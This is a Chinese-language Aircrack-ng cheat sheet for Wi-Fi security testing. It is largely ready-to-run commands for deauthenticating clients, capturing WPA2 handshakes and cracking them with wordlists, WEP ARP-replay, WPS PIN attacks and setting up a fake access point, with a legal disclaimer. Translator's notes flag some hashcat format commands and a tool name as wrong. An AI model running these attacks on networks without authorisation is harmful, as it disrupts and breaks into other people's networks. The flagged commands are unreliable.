<a id="-aircrack-ng---wifi-hacking-suite-cheatsheet"></a>
# 📶 Aircrack-ng Wi-Fi 安全测试套件速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
          Wi-Fi 安全测试套件          
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Wireless">
</p>

---

<a id="-table-of-contents"></a>
## 📋 目录

- [什么是 Aircrack-ng](#-what-is-aircrack-ng)
- [安装](#-installation)
- [监听模式（Monitor Mode）](#-monitor-mode)
- [侦察（airodump-ng）](#-reconnaissance-airodump-ng)
- [去认证（aireplay-ng）](#-deauthentication-aireplay-ng)
- [WPA/WPA2 密钥恢复](#-wpawpa2-cracking)
- [WEP 密钥恢复](#-wep-cracking)
- [WPS 攻击](#-wps-attacks)
- [其他工具](#-additional-tools)
- [完整攻击流程](#-complete-attack-workflow)
- [速查](#-quick-reference)

---

<a id="-what-is-aircrack-ng"></a>
## 🎯 什么是 Aircrack-ng

**Aircrack-ng** 是用于 Wi-Fi 网络安全评估的完整套件，包含以下工具：

- 📡 **airodump-ng** - 数据包捕获与网络发现
- 💥 **aireplay-ng** - 数据包注入与去认证攻击
- 🔓 **aircrack-ng** - WEP 与 WPA/WPA2 密钥恢复工具
- 🔧 **airmon-ng** - 启用／禁用监听模式
- 📝 **airodecap-ng** - 解密已捕获的流量

<a id="requirements"></a>
### 要求

| 要求 | 说明 |
|-------------|-------------|
| **无线网卡** | 必须支持监听模式与数据包注入 |
| **受支持的芯片组** | Atheros、Ralink、部分 Realtek |
| **操作系统** | 推荐 Linux（Kali） |

<a id="popular-compatible-adapters"></a>
### 常见兼容网卡

| 网卡 | 芯片组 | 备注 |
|---------|---------|-------|
| Alfa AWUS036ACH | RTL8812AU | 双频，性能较强 |
| Alfa AWUS036NHA | Atheros AR9271 | 经典型号，较可靠 |
| TP-Link TL-WN722N v1 | Atheros AR9271 | 低预算选择 |

---

<a id="-installation"></a>
## 🚀 安装

<a id="kali-linux-pre-installed"></a>
### Kali Linux（预装）

```bash
# 已安装，核对版本
aircrack-ng --version

# 更新
sudo apt update && sudo apt install aircrack-ng
```

<a id="debianubuntu"></a>
### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

<a id="from-source"></a>
### 从源码安装

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

<a id="-monitor-mode"></a>
## 📡 监听模式（Monitor Mode）

<a id="check-wireless-interface"></a>
### 检查无线接口

```bash
# 列出无线接口
iwconfig

# 或者
iw dev

# 或者
airmon-ng
```

<a id="enable-monitor-mode"></a>
### 启用监听模式

```bash
# 方法 1：airmon-ng（推荐）
sudo airmon-ng start wlan0

# 输出：Monitor mode enabled on wlan0mon

# 方法 2：手动配置
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

<a id="kill-interfering-processes"></a>
### 终止干扰进程

```bash
# 终止可能造成干扰的进程
sudo airmon-ng check kill

# 或手动执行
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

<a id="disable-monitor-mode"></a>
### 禁用监听模式

```bash
# 停止监听模式
sudo airmon-ng stop wlan0mon

# 重新启动 NetworkManager
sudo systemctl start NetworkManager
```

<a id="change-channel"></a>
### 更改信道

```bash
# 设置指定信道
sudo iwconfig wlan0mon channel 6

# 或使用 airmon-ng
sudo airmon-ng start wlan0 6
```

---

<a id="-reconnaissance-airodump-ng"></a>
## 🔍 侦察（airodump-ng）

<a id="basic-scan"></a>
### 基本扫描

```bash
# 扫描所有网络
sudo airodump-ng wlan0mon

# 输出：
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

<a id="scan-specific-band"></a>
### 扫描指定频段

```bash
# 仅 2.4GHz
sudo airodump-ng --band g wlan0mon

# 仅 5GHz
sudo airodump-ng --band a wlan0mon

# 两个频段
sudo airodump-ng --band abg wlan0mon
```

<a id="target-specific-network"></a>
### 锁定指定网络

```bash
# 按信道和 BSSID 过滤
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# 将捕获结果写入文件
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 生成：capture-01.cap、capture-01.csv 等文件
```

<a id="understanding-output"></a>
### 理解输出

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| 字段 | 说明 |
|-------|-------------|
| BSSID | 接入点（AP）的 MAC 地址 |
| PWR | 信号强度（越接近 0 越强） |
| Beacons | 信标帧数量 |
| #Data | 数据包数量 |
| CH | 信道 |
| ENC | 加密类型（WPA2/WPA/WEP/OPN） |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | 网络名称 |
| STATION | 已连接客户端的 MAC 地址 |

<a id="filter-options"></a>
### 过滤选项

```bash
# 仅显示加密网络
sudo airodump-ng --encrypt wpa2 wlan0mon

# 仅显示 WEP
sudo airodump-ng --encrypt wep wlan0mon

# 指定 ESSID
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

<a id="-deauthentication-aireplay-ng"></a>
## 💥 去认证（aireplay-ng）

<a id="why-deauth"></a>
### 为什么使用去认证？

去认证会促使客户端重新连接，从而有机会捕获 WPA/WPA2 密钥恢复所需的 4 次握手。

<a id="deauth-single-client"></a>
### 对单个客户端去认证

```bash
# 对指定客户端去认证
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : 去认证攻击
# 5  : 去认证次数（0 = 无限）
# -a : AP 的 BSSID
# -c : 客户端 MAC
```

<a id="deauth-all-clients"></a>
### 对所有客户端去认证

```bash
# 广播去认证（所有客户端）
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 更强烈的去认证
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

<a id="check-for-handshake"></a>
### 检查握手

```
# 在 airodump-ng 中查找：
WPA handshake: AA:BB:CC:DD:EE:FF

# 显示在右上角
```

---

<a id="-wpawpa2-cracking"></a>
## 🔓 WPA/WPA2 密钥恢复

<a id="complete-wpa2-attack-workflow"></a>
### 完整 WPA2 攻击流程

```bash
# 步骤 1：启用监听模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 步骤 2：扫描网络
sudo airodump-ng wlan0mon

# 步骤 3：锁定指定网络并捕获
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 步骤 4：对客户端去认证（新终端）
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 步骤 5：等待握手（显示在 airodump-ng 中）
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# 步骤 6：使用字典恢复密钥
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

<a id="dictionary-attack"></a>
### 字典攻击

```bash
# 基本字典攻击
aircrack-ng -w wordlist.txt capture-01.cap

# 使用 rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 多个字典
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

<a id="specify-target-essid"></a>
### 指定目标 ESSID

```bash
# 捕获文件中包含多个网络的情况
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# 或按 BSSID 指定
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

<a id="using-hashcat-faster-gpu"></a>
### 使用 Hashcat（GPU 加速）

```bash
# 将 cap 转为 Hashcat 格式
aircrack-ng capture-01.cap -J hashcat_file
# 生成：hashcat_file.hccapx（原文标注，格式问题见译注）

# 或使用 cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# 使用 Hashcat 恢复密钥
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 用于旧版 hccap 格式（原文表述，见译注）
```

<a id="convert-formats"></a>
### 转换格式

```bash
# CAP 转 HCCAPX（Hashcat）
aircrack-ng capture-01.cap -j hashcat_output

# CAP 转 PCAP
editcap capture-01.cap output.pcap

# 合并多个 cap 文件
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

<a id="-wep-cracking"></a>
## 🔐 WEP 密钥恢复

> ⚠️ WEP 已经过时且不安全。如今多数网络使用 WPA2/WPA3。

<a id="wep-attack-types"></a>
### WEP 攻击类型

| 攻击 | 说明 |
|--------|-------------|
| ARP 重放（ARP Replay） | 捕获并重放 ARP 数据包 |
| 伪认证（Fake Auth） | 无需密钥即可与 AP 关联 |
| 分片（Fragmentation） | 生成密钥流 |
| ChopChop | 无需密钥即可解密数据包 |

<a id="basic-wep-attack"></a>
### 基本 WEP 攻击

```bash
# 步骤 1：捕获流量
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# 步骤 2：伪认证
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# 步骤 3：ARP 重放攻击
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# 步骤 4：IV 数量足够时恢复密钥（>50,000）
sudo aircrack-ng wep_capture-01.cap
```

<a id="aireplay-ng-attack-modes"></a>
### aireplay-ng 攻击模式

| 模式 | 说明 |
|------|-------------|
| `-0` | 去认证 |
| `-1` | 伪认证 |
| `-2` | 交互式数据包重放 |
| `-3` | ARP 请求重放 |
| `-4` | KoreK chopchop 攻击 |
| `-5` | 分片攻击 |
| `-9` | 注入测试 |

---

<a id="-wps-attacks"></a>
## 🔓 WPS 攻击

<a id="using-reaver"></a>
### 使用 Reaver

```bash
# 安装 Reaver
sudo apt install reaver

# 基本 WPS 攻击
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# 指定信道
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Pixie-Dust 攻击（速度更快）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

<a id="using-bully"></a>
### 使用 Bully

```bash
# 安装 Bully
sudo apt install bully

# 基本攻击
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

<a id="wash-find-wps-enabled-aps"></a>
### Wash（发现已启用 WPS 的 AP）

```bash
# 扫描启用了 WPS 的网络
sudo wash -i wlan0mon

# 输出显示：
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

<a id="-additional-tools"></a>
## 🔧 其他工具

<a id="airbase-ng-fake-ap"></a>
### airbase-ng (伪造 AP)

```bash
# 创建伪造 AP
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# 指定 BSSID
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

<a id="airdecap-ng-decrypt-captures"></a>
### airdecap-ng (解密捕获文件)

```bash
# 使用已知密钥解密 WPA 捕获文件
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# 解密 WEP 捕获文件
airdecap-ng -w <wep_key> capture-01.cap
```

<a id="aircrack-ng-options"></a>
### aircrack-ng 选项

```bash
# 显示所有选项
aircrack-ng --help

# 使用多个 CPU 核心
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# 静默模式
aircrack-ng -q -w wordlist.txt capture-01.cap

# 指定 ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

<a id="packetforge-ng-create-packets"></a>
### packetforge-ng (创建数据包)

```bash
# 创建 ARP 数据包
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

<a id="-complete-attack-workflow"></a>
## 🎯 完整攻击流程

<a id="wpa2-attack-step-by-step"></a>
### WPA2 攻击（分步说明）

```bash
# 终端 1：准备
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 确认监听模式
iwconfig  # 应显示 wlan0mon

# 终端 1：扫描网络
sudo airodump-ng wlan0mon
# 记录目标的 BSSID、CH、ESSID

# 终端 1：锁定目标并捕获
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# 终端 2：去认证攻击
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# 在终端 1 等待 "WPA handshake: XX:XX:XX:XX:XX:XX"
# 按 Ctrl+C 停止捕获

# 终端 1：通过握手恢复密钥
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# 或使用 Hashcat（GPU 加速）
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

<a id="post-attack-cleanup"></a>
### 攻击后清理

```bash
# 停止监听模式
sudo airmon-ng stop wlan0mon

# 重新启动 NetworkManager
sudo systemctl start NetworkManager

# 清理文件（可选）
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

<a id="-quick-reference"></a>
## 📊 速查

<a id="essential-commands"></a>
### 常用命令

| 用途 | 命令 |
|---------|---------|
| 启动监听模式 | `airmon-ng start wlan0` |
| 停止监听模式 | `airmon-ng stop wlan0mon` |
| 终止干扰进程 | `airmon-ng check kill` |
| 扫描网络 | `airodump-ng wlan0mon` |
| 锁定目标网络 | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| 去认证 | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| 恢复 WPA 密钥 | `aircrack-ng -w wordlist.txt capture.cap` |

<a id="attack-summary"></a>
### 攻击汇总

| 攻击 | 加密方式 | 方法 |
|--------|------------|--------|
| 字典攻击 | WPA/WPA2 | 捕获握手 → 使用字典恢复密钥 |
| Reaver | WPS | 暴力枚举 WPS PIN |
| Pixie-Dust | WPS | 离线 WPS 攻击 |
| ARP 重放（ARP Replay） | WEP | 收集 IV → 恢复密钥 |

<a id="useful-wordlists"></a>
### 常用字典

| 路径 | 说明 |
|------|-------------|
| `/usr/share/wordlists/rockyou.txt` | 最常用（Kali） |
| `/usr/share/wordlists/fasttrack.txt` | 快速检查 |
| `/usr/share/seclists/Passwords/` | SecLists 合集 |

<a id="troubleshooting"></a>
### 故障排查

```bash
# 接口无法进入监听模式
sudo rfkill unblock wifi
sudo rfkill unblock all

# 检查驱动是否支持注入
sudo aireplay-ng -9 wlan0mon

# 未捕获到握手
# - 靠近目标
# - 尝试不同客户端
# - 尝试更强烈的去认证
# - 延长等待时间

# Airmon 显示 "Found X processes"
sudo airmon-ng check kill
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ 法律免责声明

```
⚠️ 警告：这些工具仅可用于自己拥有的网络，或
已取得明确书面测试许可的网络。未经授权访问
计算机网络，在多数司法辖区属于违法行为。

负责任地用于：
✅ 安全审计
✅ 渗透测试（已获许可）
✅ 学习用途（实验环境）

绝不用于：
❌ 未经授权访问网络
❌ 窃取凭据
❌ 任何恶意目的
```

---

<a id="-resources"></a>
## 📚 参考资料

- [Aircrack-ng 官方网站](https://www.aircrack-ng.org/)
- [Aircrack-ng 维基](https://www.aircrack-ng.org/doku.php)
- [Hashcat Wi-Fi 文档](https://hashcat.net/wiki/)

<a id="related-cheatsheets"></a>
### 相关速查表
- [Hashcat](../../Hashcat/translations/README.zh-CN.md)
- [Wireshark](../../Wireshark/translations/README.zh-CN.md)
- [Linux 命令](../../Linux-Commands/translations/README.zh-CN.md)

---

<p align="center">
  <b>📶 掌握 Wi-Fi 安全测试！</b><br>
  <i>Aircrack-ng：Wi-Fi 渗透测试人员的得力助手</i>
</p>

> 译注：[Aircrack-ng 官方文档](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)将 WPA/WPA2 字典恢复限定为 PSK；不能据此推断同样适用于 Enterprise／802.1X 或 WPA3-SAE。网卡的监听／注入能力取决于硬件版本和驱动，去认证也不保证取得可用握手；WEP 所需 IV 数量仅为经验示例。原文的 airodecap-ng 是拼写错误，官方工具名为 [airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng)。

> 译注：格式转换示例混用了旧格式与新模式。官方参数说明中 -j 导出 HCCAPX，-J 导出旧 Hashcat 捕获格式；[Hashcat WPA/WPA2 文档](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)说明模式 22000 使用文本形式的 PMKID/EAPOL 哈希，不能直接把示例中的 .hccapx 文件传给该模式。仅修改扩展名也不能转换格式；旧模式和工具的兼容性须按实际版本核对。原始命令、文件名与输出样例均保留原样。
